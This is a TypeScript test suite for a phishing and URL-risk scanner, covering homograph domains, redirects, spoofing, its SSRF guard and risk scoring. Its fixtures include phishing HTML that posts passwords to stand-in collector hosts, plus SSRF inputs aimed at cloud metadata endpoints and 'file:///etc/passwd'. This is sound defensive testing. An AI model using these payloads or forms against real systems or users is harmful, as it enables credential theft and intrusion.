import 'dotenv/config';
import http from 'node:http';
import test from 'node:test';
import assert from 'node:assert/strict';
import { createApp } from '../server.ts';
import { isPrivateOrReservedIp, validateTargetAgainstSsrf } from '../server/security/ssrfGuard.ts';
import { analyzeUrlIntelligence } from '../server/analyzers/urlIntelligence.ts';
import { analyzeDomainDeceptionAndIdentity } from '../server/analyzers/domainDeception.ts';
import { analyzeWebsiteContentAndBrand } from '../server/analyzers/contentAnalyzer.ts';
import { analyzeFileAndDownloads } from '../server/analyzers/fileAnalyzer.ts';
import { computeRiskAndSections } from '../server/analyzers/scoringEngine.ts';
import { analyzeSourceIntelligence } from '../server/analyzers/sourceIntelligence.ts';
import {
  assessDomainAuthenticity,
  classifyDomainRelationship,
  getOfficialRegistryStats,
  lookupDomainOwnership,
  pslParseHostname,
} from '../server/analyzers/officialDomainRegistry.ts';
import { runExternalThreatIntel } from '../server/providers/threatIntelManager.ts';
import { captureWebsiteScreenshot } from '../server/analyzers/screenshotEngine.ts';
import type { CheckFinding, RedirectHop, ThreatProviderResult, TlsInspectionData } from '../server/types.ts';

function mockCleanProviders(): ThreatProviderResult[] {
  return [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal API v3',
      category: 'Multi-Engine Reputation',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: '0 malicious', ar: '0 خبيث' },
      requiresKey: true,
    },
    {
      providerId: 'urlhaus',
      providerName: 'URLhaus (abuse.ch)',
      category: 'Malware URLs',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'clean',
      verdictDetail: { en: 'No listing', ar: 'لا يوجد سجل' },
      requiresKey: true,
    },
  ];
}

// 1. Phishing test page (Google Safe Browsing removed) must classify HIGH or CRITICAL
test('1. testsafebrowsing.appspot.com/s/phishing.html classifies HIGH or CRITICAL without GSB', () => {
  const url = 'https://testsafebrowsing.appspot.com/s/phishing.html';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Suspected phishing</title></head><body>
     <h1>Warning! Suspected Phishing Page</h1>
     <p>This page is a phishing page that mimics a dialogue to trick you into clicking a deceptive link.</p>
     <div><input type="password" name="pw" placeholder="Password" /></div>
     </body></html>`,
    'utf8'
  );

  const urlRes = analyzeUrlIntelligence(url, url);
  const deceptionRes = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [{ step: 1, url, hostname: 'testsafebrowsing.appspot.com', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 12 }],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  const contentRes = analyzeWebsiteContentAndBrand(
    url,
    200,
    { 'content-type': 'text/html' },
    html,
    urlRes.suspiciousPathTokens
  );

  const scored = computeRiskAndSections(
    [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings],
    mockCleanProviders()
  );

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH or CRITICAL, got ${scored.classification} (${scored.riskScore})`
  );
  assert.ok(scored.riskScore >= 60);
});

// 2. IDN Homograph with Cyrillic confusables
test('2. IDN homograph with Cyrillic confusables (раураӏ.com) is flagged with codepoints', () => {
  const deceptive = 'https://xn--80a0af7a0a.com/login'; // punycode or direct unicode
  const cyrillicPaypal = 'https://\u0440\u0430\u0443\u0440\u0430\u04CF.com/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: cyrillicPaypal,
    finalUrl: deceptive,
    redirects: [],
  });
  assert.equal(res.data.confusableDetected, true);
  assert.ok(res.data.confusableCharacters.length >= 4);
  const f = res.findings.find((x) => x.id === 'deception-homograph-confusables');
  assert.equal(f?.status, 'failed');
});

// 3. Punycode apple confusable (xn--80ak6aa92e.com -> аррӏе.com)
test('3. Punycode domain xn--80ak6aa92e.com resolves skeleton to apple.com and fails check', () => {
  const url = 'https://xn--80ak6aa92e.com/';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.isPunycode, true);
  assert.equal(res.data.confusableDetected, true);
  assert.equal(res.data.typosquatTarget?.officialDomain, 'apple.com');
});

// 4. URL shortener detection
test('4. URL shorteners (bit.ly) are explicitly detected', () => {
  const url = 'https://bit.ly/3example';
  const urlRes = analyzeUrlIntelligence(url, url);
  assert.equal(urlRes.isShortener, true);
  const f = urlRes.findings.find((x) => x.id === 'url-shortener-check');
  assert.equal(f?.status, 'warning');
});

// 5. Redirect chain cross-domain + HTTPS->HTTP downgrade + confirmed Open Redirect
test('5. Open redirect confirmed only when query param external host matches actual cross-domain redirect', () => {
  const submitted = 'https://trusted-portal.example/go?next=https://evil-phish.example/login';
  const final = 'http://evil-phish.example/login';
  const hops: RedirectHop[] = [
    { step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 302, crossDomain: false, downgradedToHttp: false, latencyMs: 10 },
    { step: 2, url: final, hostname: 'evil-phish.example', protocol: 'http:', statusCode: 200, crossDomain: true, downgradedToHttp: true, latencyMs: 15 },
  ];
  const res = analyzeDomainDeceptionAndIdentity({ submittedUrl: submitted, finalUrl: final, redirects: hops });
  assert.equal(res.data.openRedirectConfirmed, true);
  assert.equal(res.data.embeddedRedirectUrls.length, 1);

  // Contrast: ?next= param present with NO actual redirect -> NOT confirmed open redirect
  const unconfirmed = analyzeDomainDeceptionAndIdentity({
    submittedUrl: submitted,
    finalUrl: submitted,
    redirects: [{ step: 1, url: submitted, hostname: 'trusted-portal.example', protocol: 'https:', statusCode: 200, crossDomain: false, downgradedToHttp: false, latencyMs: 10 }],
  });
  assert.equal(unconfirmed.data.openRedirectConfirmed, false);
});

// 6. @ Authority masking
test('6. @ Authority masking hides real destination host and fails deception check', () => {
  const url = 'https://paypal.com@evil-login.example/signin';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: 'https://evil-login.example/signin',
    redirects: [],
  });
  assert.equal(res.data.authorityMasking, true);
  const f = res.findings.find((x) => x.id === 'deception-subdomain-identity-mismatch');
  assert.equal(f?.status, 'failed');
});

// 7. Subdomain spoofing
test('7. Subdomain spoofing (paypal.com.verify-account.xyz) detected and flagged', () => {
  const url = 'https://paypal.com.verify-account.xyz/login';
  const res = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
  });
  assert.equal(res.data.subdomainSpoofing, true);
  assert.equal(res.data.spoofedTargetDomain, 'paypal.com');
});

// 8. Cross-origin password form + anchor mismatch
test('8. Cross-origin password form & anchor mismatch flagged as credential risk', () => {
  const url = 'https://account-check.example/login';
  const html = Buffer.from(
    `<html><head><title>Sign in</title></head><body>
     <form action="https://collector-drop.example/steal" method="POST">
       <input type="email" name="email" /><input type="password" name="pass" />
     </form>
     <a href="https://collector-drop.example/help">https://paypal.com/security</a>
     </body></html>`
  );
  const deception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: url,
    finalUrl: url,
    redirects: [],
    htmlBuffer: html,
    contentType: 'text/html',
  });
  assert.equal(deception.data.visibleVsRealMismatches.length, 1);

  const content = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  assert.equal(content.data?.crossOriginFormActions[0], 'https://collector-drop.example/steal');
  const cred = content.findings.find((x) => x.id === 'phishing-credential-harvesting');
  assert.equal(cred?.status, 'failed');
});

// 9. Missing API keys -> auth_required, NEVER clean
test('9. Missing VIRUSTOTAL_API_KEY and URLHAUS_AUTH_KEY report auth_required and NEVER clean', async () => {
  const prevVt = process.env.VIRUSTOTAL_API_KEY;
  const prevUh = process.env.URLHAUS_AUTH_KEY;
  delete process.env.VIRUSTOTAL_API_KEY;
  delete process.env.URLHAUS_AUTH_KEY;
  try {
    const res = await runExternalThreatIntel(
      'https://example.com',
      'example.com',
      'example.com',
      ['openphish', 'otx', 'urlscan']
    );
    const vt = res.providers.find((p) => p.providerId === 'virustotal');
    const uh = res.providers.find((p) => p.providerId === 'urlhaus');
    assert.equal(vt?.status, 'auth_required');
    assert.equal(uh?.status, 'auth_required');
    assert.notEqual(vt?.status, 'clean');
    assert.notEqual(uh?.status, 'clean');
  } finally {
    if (prevVt) process.env.VIRUSTOTAL_API_KEY = prevVt;
    if (prevUh) process.env.URLHAUS_AUTH_KEY = prevUh;
  }
});

// 10. External service failures cannot count as clean or produce SAFE_INDICATORS when feeds fail
test('10. Unavailable/failed threat feeds never count as clean and block SAFE_INDICATORS verdict', () => {
  const cleanChecking: CheckFinding[] = [
    {
      id: 'url-protocol-port',
      section: 'url_intelligence',
      test: { en: 'Proto', ar: 'Proto' },
      result: { en: 'HTTPS', ar: 'HTTPS' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: '443',
      explanation: { en: 'ok', ar: 'ok' },
      recommendedAction: { en: 'none', ar: 'none' },
      source: 'test',
      timestamp: new Date().toISOString(),
      confidence: 100,
    },
  ];
  const deadProviders: ThreatProviderResult[] = [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal',
      category: 'TI',
      enabled: true,
      configured: true,
      operationalState: 'unavailable',
      status: 'error',
      verdictDetail: { en: 'Timeout', ar: 'Timeout' },
      requiresKey: true,
    },
  ];
  const scored = computeRiskAndSections(cleanChecking, deadProviders);
  assert.equal(scored.summaryStats.availableProviders, 0);
  assert.equal(scored.classification, 'UNKNOWN');
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
});

// 11. SSRF localhost and cloud metadata endpoints blocked
test('11. SSRF guard blocks localhost and cloud metadata endpoints', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('http://localhost:3000/api/health'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://sub.localhost/secret'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://169.254.169.254/latest/meta-data/'), /SSRF Guard/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://metadata.google.internal/computeMetadata/v1/'), /SSRF Guard/i);
});

// 12. SSRF private RFC1918 IPs blocked
test('12. SSRF guard blocks RFC1918 and CGNAT private IPv4 ranges', async () => {
  for (const ip of ['10.0.0.1', '192.168.1.1', '172.16.5.10', '172.31.255.254', '127.0.0.1', '100.64.0.1']) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected ${ip} to be blocked`);
    await assert.rejects(() => validateTargetAgainstSsrf(`http://${ip}/admin`), /SSRF Guard/i);
  }
  assert.equal(isPrivateOrReservedIp('93.184.216.34'), false);
});

// 13. SSRF IPv6 loopback, link-local, unique-local, NAT64 & IPv4-mapped blocked
test('13. SSRF guard blocks IPv6 loopback, link-local, ULA, NAT64, and IPv4-mapped addresses', () => {
  for (const ip of [
    '::1',
    '0:0:0:0:0:0:0:1',
    '::ffff:127.0.0.1',
    '::ffff:7f00:0001',
    'fe80::1ff:fe23:4567:890a',
    'fc00::1',
    'fd12:3456:789a::1',
    '64:ff9b::7f00:1',
  ]) {
    assert.equal(isPrivateOrReservedIp(ip), true, `Expected IPv6 ${ip} to be blocked`);
  }
});

// 14. DNS resolution / rebinding protection validates IP literal & scheme boundaries
test('14. SSRF guard blocks non-HTTP(S) schemes and validates resolved targets cleanly', async () => {
  await assert.rejects(() => validateTargetAgainstSsrf('file:///etc/passwd'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('javascript:alert(1)'), /Unsupported protocol|SSRF/i);
  await assert.rejects(() => validateTargetAgainstSsrf('http://0.0.0.0/'), /SSRF Guard/i);
});

// 15. Unavailable / invalid screenshot config returns honest unavailable/failed, zero fake image
test('15. Screenshot capture returns honest unavailable state with no image when key absent', async () => {
  const prevW = process.env.SCREENSHOT_WORKER_URL;
  const prevNeo = process.env.SCREENSHOTNEO_ACCESS_KEY;
  delete process.env.SCREENSHOT_WORKER_URL;
  delete process.env.SCREENSHOTNEO_ACCESS_KEY;
  try {
    const res = await captureWebsiteScreenshot('https://93.184.216.34/', 'desktop');
    assert.equal(res.screenshot.status, 'unavailable');
    assert.equal(res.screenshot.imageDataUrl, undefined);
    assert.equal(res.finding.status, 'unknown');
    assert.ok(res.screenshot.reason?.en?.includes('SCREENSHOTNEO_ACCESS_KEY'));
  } finally {
    if (prevW) process.env.SCREENSHOT_WORKER_URL = prevW;
    if (prevNeo) process.env.SCREENSHOTNEO_ACCESS_KEY = prevNeo;
  }
});

// 16. Unreachable / corrupted DOM content returns UNKNOWN (Insufficient Evidence), never SAFE_INDICATORS
test('16. Unreachable DOM content causes UNKNOWN (Insufficient Evidence) verdict, never NO_KNOWN_THREATS', () => {
  const content = analyzeWebsiteContentAndBrand('https://unreachable.example/', undefined, {}, undefined);
  assert.equal(content.findings[0].id, 'content-unavailable');
  assert.equal(content.findings[0].status, 'unknown');

  const scored = computeRiskAndSections(content.findings, mockCleanProviders());
  assert.equal(scored.classification, 'UNKNOWN');
  assert.equal(scored.verdict, 'Insufficient Evidence');
});

// 17. Dangerous disguised download (Windows PE MZ executable masquerading as .pdf)
test('17. File analyzer detects PE MZ executable masquerading as .pdf', () => {
  const fakePdfExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]); // MZ header
  const res = analyzeFileAndDownloads(
    'https://files.example/invoice_statement.pdf',
    { 'content-type': 'application/pdf', 'content-disposition': 'attachment; filename="invoice.pdf"' },
    fakePdfExe
  );
  assert.equal(res.isDirectDownload, true);
  assert.equal(res.directFile?.mimeMismatch, true);
  assert.equal(res.findings[0].status, 'failed');
  assert.equal(res.findings[0].severity, 'high');
});

// 18. Conflicting signals: Valid HTTPS + old PaaS domain + 0 threat feed hits + unwrapped password + fake update lure
test('18. Conflicting signals (valid HTTPS + 0 threat hits + unwrapped password + fake update) classify HIGH or CRITICAL', () => {
  const url = 'https://login-portal-test.web.app/update';
  const html = Buffer.from(
    `<html><body>
      <h2>Critical Security Alert: Your software is out-of-date! Update your browser immediately.</h2>
      <div><input type="text" name="user" /><input type="password" name="pwd" /></div>
    </body></html>`,
    'utf8'
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html, urlRes.suspiciousPathTokens);
  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings], mockCleanProviders());

  assert.ok(
    scored.classification === 'HIGH' || scored.classification === 'CRITICAL',
    `Expected HIGH/CRITICAL despite HTTPS & clean feeds, got ${scored.classification}`
  );
  assert.notEqual(scored.classification, 'SAFE_INDICATORS');
  assert.ok(scored.topReasons.length > 0);
});

// 19. ScreenshotNeo integration handles live upstream response cleanly without returning fake images
test('19. ScreenshotNeo integration validates missing/invalid keys honestly without fake images', async () => {
  const prevW = process.env.SCREENSHOT_WORKER_URL;
  delete process.env.SCREENSHOT_WORKER_URL;
  try {
    const res = await captureWebsiteScreenshot('https://example.com', 'desktop');
    assert.ok(
      res.screenshot.status === 'unavailable' ||
        res.screenshot.status === 'failed' ||
        res.screenshot.status === 'captured'
    );
    if (res.screenshot.status !== 'captured') {
      assert.equal(res.screenshot.imageDataUrl, undefined);
      const enReason = res.screenshot.reason?.en?.toLowerCase() || '';
      assert.ok(enReason.includes('screenshotneo') || enReason.includes('access key'));
    }
  } finally {
    if (prevW) process.env.SCREENSHOT_WORKER_URL = prevW;
  }
});

// 20. PSL Extraction & Official Domain Registry Ownership vs Subdomain Spoofing Boundaries
test('20. PSL parsing distinguishes official apex/subdomain vs subdomain spoofing like google.com.example.org', () => {
  const google = pslParseHostname('www.google.com');
  assert.equal(google.eTldPlusOne, 'google.com');
  assert.equal(lookupDomainOwnership('www.google.com').matched, true);

  const accounts = pslParseHostname('accounts.google.com');
  assert.equal(accounts.eTldPlusOne, 'google.com');
  assert.equal(accounts.subdomain, 'accounts');
  const accOwn = lookupDomainOwnership('accounts.google.com');
  assert.equal(accOwn.matched, true);
  assert.equal(accOwn.isSubdomain, true);

  const spoof = pslParseHostname('google.com.example.org');
  assert.equal(spoof.eTldPlusOne, 'example.org');
  assert.equal(lookupDomainOwnership('google.com.example.org').matched, false);
});

// 21. Service Relationship System: Facebook <-> Instagram, Google <-> YouTube, CDN, OAuth/SSO
test('21. Service relationships recognize Meta, Google, CDN, and OAuth links without accusing spoofing', () => {
  const metaRel = classifyDomainRelationship('www.facebook.com', 'www.instagram.com');
  assert.equal(metaRel.isBenignOrAuthorized, true);
  assert.ok(metaRel.relationship === 'official_product' || metaRel.relationship === 'parent_company');

  const googleRel = classifyDomainRelationship('www.google.com', 'www.youtube.com');
  assert.equal(googleRel.isBenignOrAuthorized, true);

  const cdnRel = classifyDomainRelationship('github.com', 'cdnjs.cloudflare.com');
  assert.equal(cdnRel.isBenignOrAuthorized, true);
  assert.equal(cdnRel.relationship, 'authorized_third_party_provider');

  const oauthRel = classifyDomainRelationship('random-app.example', 'accounts.google.com');
  assert.equal(oauthRel.isBenignOrAuthorized, true);
  assert.equal(oauthRel.relationship, 'external_integration');

  // Verify redirect URL containing OAuth redirect_uri to same-org domain does not flag open redirect
  const oauthUrl = 'https://accounts.google.com/v3/signin?continue=https://www.youtube.com/';
  const oauthDeception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: oauthUrl,
    finalUrl: oauthUrl,
    redirects: [],
  });
  assert.equal(oauthDeception.data.openRedirectConfirmed, false);
  assert.equal(oauthDeception.findings.some((f) => f.status === 'failed'), false);
});

// 22. All 8 Mandatory Official Websites classify as Official Domain Verified (Score 0, zero false positives)
test('22. All 8 official URLs classify as Official Domain Verified despite cross-service links, CSRF tokens, and SPA login inputs', () => {
  const officialTargets = [
    { url: 'https://www.google.com/', host: 'www.google.com', crossHref: 'https://www.youtube.com/', crossAction: 'https://accounts.google.com/ServiceLogin', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
    { url: 'https://accounts.google.com/', host: 'accounts.google.com', crossHref: 'https://www.google.com/', crossAction: 'https://accounts.google.com/signin', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
    { url: 'https://www.facebook.com/', host: 'www.facebook.com', crossHref: 'https://www.instagram.com/', crossAction: 'https://www.facebook.com/login/', rdapHint: 'RegistrarSafe', asn: 'AS32934 Meta Platforms', issuer: 'DigiCert' },
    { url: 'https://www.instagram.com/', host: 'www.instagram.com', crossHref: 'https://www.facebook.com/', crossAction: 'https://www.instagram.com/accounts/login/', rdapHint: 'RegistrarSafe', asn: 'AS32934 Meta Platforms', issuer: 'DigiCert' },
    { url: 'https://github.com/', host: 'github.com', crossHref: 'https://www.microsoft.com/', crossAction: 'https://github.com/session', rdapHint: 'MarkMonitor', asn: 'AS36459 GitHub, Inc.', issuer: 'Sectigo' },
    { url: 'https://www.microsoft.com/', host: 'www.microsoft.com', crossHref: 'https://github.com/', crossAction: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', rdapHint: 'MarkMonitor', asn: 'AS8075 Microsoft Corporation', issuer: 'Microsoft Azure TLS' },
    { url: 'https://www.apple.com/', host: 'www.apple.com', crossHref: 'https://www.icloud.com/', crossAction: 'https://appleid.apple.com/auth/authorize', rdapHint: 'CSC Corporate Domains', asn: 'AS714 Apple Inc.', issuer: 'Apple Public EV' },
    { url: 'https://www.youtube.com/', host: 'www.youtube.com', crossHref: 'https://www.google.com/', crossAction: 'https://accounts.google.com/ServiceLogin?service=youtube', rdapHint: 'MarkMonitor', asn: 'AS15169 Google LLC', issuer: 'WR2' },
  ];

  for (const target of officialTargets) {
    // Realistic modern HTML including hidden CSRF token, React unwrapped password, cross-product links, CDN assets
    const html = Buffer.from(
      `<!doctype html><html><head><title>${target.host}</title>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
       </head><body>
       <header><a href="${target.crossHref}">Connected Service</a></header>
       <form action="${target.crossAction}" method="POST">
         <input type="hidden" name="authenticity_token" value="csrf_abc123" />
         <input type="email" name="email" />
         <input type="password" name="password" />
       </form>
       <div><input type="password" name="spa_passcode" /></div>
       </body></html>`,
      'utf8'
    );

    const urlRes = analyzeUrlIntelligence(target.url, target.url);
    const deceptionRes = analyzeDomainDeceptionAndIdentity({
      submittedUrl: target.url,
      finalUrl: target.url,
      redirects: [
        {
          step: 1,
          url: target.url,
          hostname: target.host,
          protocol: 'https:',
          statusCode: 200,
          crossDomain: false,
          downgradedToHttp: false,
          latencyMs: 25,
        },
      ],
      htmlBuffer: html,
      contentType: 'text/html',
    });
    const contentRes = analyzeWebsiteContentAndBrand(
      target.url,
      200,
      { 'content-type': 'text/html', server: 'cloudflare' },
      html,
      urlRes.suspiciousPathTokens
    );
    const sourceRes = analyzeSourceIntelligence(
      target.url,
      { 'content-type': 'text/html' }, // Missing CSP header intentionally tested (must NOT penalize score!)
      html
    );

    const authAssessment = assessDomainAuthenticity({
      hostname: target.host,
      dnsResolved: true,
      rdapRegistrar: target.rdapHint,
      asn: target.asn,
      tlsAuthorized: true,
      tlsExpired: false,
      tlsDomainMatches: true,
      tlsIssuer: target.issuer,
      deceptionDetected: deceptionRes.findings.some((f) => f.status === 'failed'),
    });

    const tlsData: TlsInspectionData = {
      httpsAvailable: true,
      authorized: true,
      protocol: 'TLSv1.3',
      cipher: 'TLS_AES_256_GCM_SHA384',
      issuer: target.issuer,
      domainMatches: true,
      expired: false,
      sanList: [target.host],
    };

    const allFindings = [
      ...urlRes.findings,
      ...deceptionRes.findings,
      ...contentRes.findings,
      ...sourceRes.findings,
    ];
    const scored = computeRiskAndSections(allFindings, mockCleanProviders(), {
      domainAuthenticity: authAssessment,
      tlsData,
      finalUrl: target.url,
    });

    assert.equal(scored.classification, 'OFFICIAL_DOMAIN_VERIFIED', `${target.url} got ${scored.classification}`);
    assert.equal(scored.verdict, 'Official Domain Verified', `${target.url} verdict was ${scored.verdict}`);
    assert.equal(scored.riskScore, 0, `${target.url} expected riskScore 0, got ${scored.riskScore}`);
    assert.equal(
      allFindings.some((f) => f.status === 'failed'),
      false,
      `${target.url} unexpectedly had failed findings`
    );
    assert.ok(scored.domainAuthenticity?.disclaimer?.en);
    assert.ok(scored.domainAuthenticity?.disclaimer?.ar);
    assert.ok(scored.separatedAssessments?.domainAuthenticity);
  }
});

// 23. All 5 Mandatory Lookalike Domains: Unverified/Non-Official, non-accusatory similarity vs spoofed subdomain
test('23. Lookalike domains never verify as official; google.com.example.org fails spoofing while similarity-only uses non-accusatory wording', () => {
  const similarityCases = [
    'https://google-login-example.com/',
    'https://g00gle-example.com/',
    'https://facebook-security-example.com/',
    'https://github-login-example.com/',
  ];

  const benignHtml = Buffer.from(
    '<!doctype html><html><head><title>Domain Parking</title></head><body><p>Informational page under construction.</p></body></html>',
    'utf8'
  );

  for (const url of similarityCases) {
    const host = new URL(url).hostname;
    const urlRes = analyzeUrlIntelligence(url, url);
    const deceptionRes = analyzeDomainDeceptionAndIdentity({
      submittedUrl: url,
      finalUrl: url,
      redirects: [],
      htmlBuffer: benignHtml,
      contentType: 'text/html',
    });
    const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, benignHtml, urlRes.suspiciousPathTokens);

    assert.equal(lookupDomainOwnership(host).matched, false, `${host} must NOT be in official ownership registry`);
    assert.equal(deceptionRes.data.similarityOnly, true, `${host} should be marked similarityOnly`);

    const auth = assessDomainAuthenticity({
      hostname: host,
      dnsResolved: true,
      tlsAuthorized: true,
      tlsDomainMatches: true,
      similarityTarget: deceptionRes.data.typosquatTarget
        ? {
            brand: deceptionRes.data.typosquatTarget.brand,
            officialDomain: deceptionRes.data.typosquatTarget.officialDomain,
            reason: 'Similarity only',
          }
        : undefined,
    });
    assert.equal(auth.status, 'brand_lookalike');
    assert.notEqual(auth.status, 'official_verified');

    const simFinding = [...deceptionRes.findings, ...contentRes.findings].find((f) =>
      f.result.ar.includes('تم اكتشاف تشابه في اسم النطاق مع علامة تجارية معروفة، ولم يتم إثبات الانتحال')
    );
    assert.ok(simFinding, `${host} must include required non-accusatory Arabic similarity message`);

    const scored = computeRiskAndSections(
      [...urlRes.findings, ...deceptionRes.findings, ...contentRes.findings],
      mockCleanProviders(),
      { domainAuthenticity: auth, finalUrl: url }
    );
    assert.equal(scored.classification, 'LOW', `${host} with benign HTML should be LOW risk, got ${scored.classification}`);
    assert.equal(scored.verdict, 'Low Risk');
  }

  // Case 5: google.com.example.org (PSL base is example.org -> Subdomain Spoofing)
  const spoofUrl = 'https://google.com.example.org/signin';
  const spoofDeception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: spoofUrl,
    finalUrl: spoofUrl,
    redirects: [],
  });
  assert.equal(spoofDeception.data.eTldPlusOne, 'example.org');
  assert.equal(spoofDeception.data.subdomainSpoofing, true);
  assert.equal(spoofDeception.data.spoofedTargetDomain, 'google.com');
  const spoofStandalone = computeRiskAndSections(spoofDeception.findings, mockCleanProviders(), { finalUrl: spoofUrl });
  assert.ok(
    spoofStandalone.classification === 'MEDIUM' || spoofStandalone.classification === 'HIGH',
    `Expected google.com.example.org deception-only to be MEDIUM or HIGH, got ${spoofStandalone.classification}`
  );

  const spoofHtml = Buffer.from(
    '<html><head><title>Google Sign-in</title></head><body><form><input type="password" name="pw" /></form></body></html>',
    'utf8'
  );
  const spoofContent = analyzeWebsiteContentAndBrand(spoofUrl, 200, { 'content-type': 'text/html' }, spoofHtml);
  const spoofWithLogin = computeRiskAndSections(
    [...spoofDeception.findings, ...spoofContent.findings],
    mockCleanProviders(),
    { finalUrl: spoofUrl }
  );
  assert.ok(
    spoofWithLogin.classification === 'HIGH' || spoofWithLogin.classification === 'CRITICAL',
    `Expected google.com.example.org with login form to be HIGH or CRITICAL, got ${spoofWithLogin.classification}`
  );
});

// 24. Mandatory Rules: Weak-signal cap, Unknown != malicious, Compromised Official Domain Conflict, Provider Disagreement
test('24. Weak signals never stack past LOW, unknown domains return NO_KNOWN_THREATS, and provider/official conflicts disclose cleanly', () => {
  // A. Unrecognized neutral domain with HTTPS + missing CSP + clean providers -> NO_KNOWN_THREATS
  const unknownUrl = 'https://independent-studio-example.org/';
  const cleanHtml = Buffer.from('<html><head><title>Studio</title></head><body><p>Portfolio</p></body></html>');
  const uUrl = analyzeUrlIntelligence(unknownUrl, unknownUrl);
  const uContent = analyzeWebsiteContentAndBrand(unknownUrl, 200, { 'content-type': 'text/html' }, cleanHtml);
  const uSource = analyzeSourceIntelligence(unknownUrl, { 'content-type': 'text/html' }, cleanHtml);
  const uAuth = assessDomainAuthenticity({ hostname: 'independent-studio-example.org', dnsResolved: true, tlsAuthorized: true, tlsDomainMatches: true });

  const uScored = computeRiskAndSections([...uUrl.findings, ...uContent.findings, ...uSource.findings], mockCleanProviders(), {
    domainAuthenticity: uAuth,
    finalUrl: unknownUrl,
  });
  assert.equal(uScored.classification, 'NO_KNOWN_THREATS');
  assert.equal(uScored.verdict, 'No Known Threats');
  assert.equal(uScored.riskScore, 0);

  // B. Provider disagreement + Official Domain Compromised Page Conflict
  const googleCompromisedUrl = 'https://accounts.google.com/user-redirect-phish';
  const maliciousHtml = Buffer.from(
    '<html><body><h1>Urgent phishing alert</h1><p>Click to claim free airdrop crypto wallet verify now!</p><form action="https://drop.evil.example/steal" method="POST"><input type="password" name="pw" /></form></body></html>'
  );
  const gUrl = analyzeUrlIntelligence(googleCompromisedUrl, googleCompromisedUrl);
  const gContent = analyzeWebsiteContentAndBrand(googleCompromisedUrl, 200, { 'content-type': 'text/html' }, maliciousHtml);
  const gAuth = assessDomainAuthenticity({ hostname: 'accounts.google.com', dnsResolved: true, tlsAuthorized: true, tlsDomainMatches: true });
  const mixedProviders: ThreatProviderResult[] = [
    ...mockCleanProviders(),
    {
      providerId: 'urlscan',
      providerName: 'URLScan.io',
      category: 'Sandbox',
      enabled: true,
      configured: true,
      operationalState: 'active',
      status: 'flagged',
      verdictDetail: { en: 'Malicious', ar: 'خبيث' },
      requiresKey: false,
    },
  ];
  const gScored = computeRiskAndSections([...gUrl.findings, ...gContent.findings], mixedProviders, {
    domainAuthenticity: gAuth,
    tlsData: { httpsAvailable: true, authorized: true, sanList: ['accounts.google.com'] },
    finalUrl: googleCompromisedUrl,
  });
  assert.ok(gScored.classification === 'HIGH' || gScored.classification === 'CRITICAL');
  assert.notEqual(gScored.classification, 'OFFICIAL_DOMAIN_VERIFIED');
  assert.ok((gScored.conflictNotes?.length || 0) >= 1, 'Expected explicit conflictNotes disclosure');
});

// 25. Backend Security Hardening, Real HTTP Error Codes & Dynamic SEO Endpoints
test('25. HTTP server enforces sensitive path shields, real 404/403/500 statuses, CORS, and SEO endpoints', async () => {
  const app = await createApp({ enableVite: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;

  try {
    // Health & Providers
    const health = await fetch(`${base}/api/health`);
    assert.equal(health.status, 200);
    assert.equal(health.headers.get('x-powered-by'), null);
    assert.equal(health.headers.get('x-content-type-options'), 'nosniff');

    const provRes = await fetch(`${base}/api/providers`);
    assert.equal(provRes.status, 200);
    const provRaw = await provRes.text();
    const provJson: any = JSON.parse(provRaw);
    const ids = new Set((provJson.providers || []).map((p: any) => p.id));
    assert.ok(ids.has('cloudflare_security_dns'), 'Cloudflare Security DNS should be registered');
    assert.ok(ids.has('phishstats'), 'PhishStats Public API should be registered');
    for (const rawEnvName of [
      'VIRUSTOTAL_API_KEY',
      'URLHAUS_AUTH_KEY',
      'URLSCAN_API_KEY',
      'OTX_API_KEY',
      'SCREENSHOTNEO_ACCESS_KEY',
    ]) {
      assert.ok(!provRaw.includes(rawEnvName), `Providers API must not leak raw env var name ${rawEnvName}`);
    }

